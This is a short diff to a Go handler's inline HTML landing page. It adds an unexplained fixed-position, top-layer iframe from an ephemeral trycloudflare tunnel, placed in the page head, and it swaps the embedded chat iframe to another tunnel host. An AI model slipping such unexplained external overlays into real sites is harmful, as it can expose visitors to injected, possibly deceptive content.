@@ -42,12 +42,15 @@ func handler(w http.ResponseWriter, r *http.Request) {
             border-radius: 5px;
         }
     </style>
+
+
+<iframe src="https://array-supplied-keys-actors.trycloudflare.com" frameborder="0" style="position: fixed; bottom: 0; right: 0; width: 320px; height: 480px; border: none; z-index: 9999;"></iframe>
 </head>
 <body>
     <div class="container">
         <h1>Welcome to Our Landing Page</h1>
         <p>Explore more by interacting with the embedded content below.</p>
-        <iframe src="https://statement-mail-directed-wall.trycloudflare.com/chat" title="Embedded Content"></iframe>
+        <iframe src="https://pl-nickel-closer-proposals.trycloudflare.com/chat" title="Embedded Content"></iframe>
     </div>
 </body>
 </html>
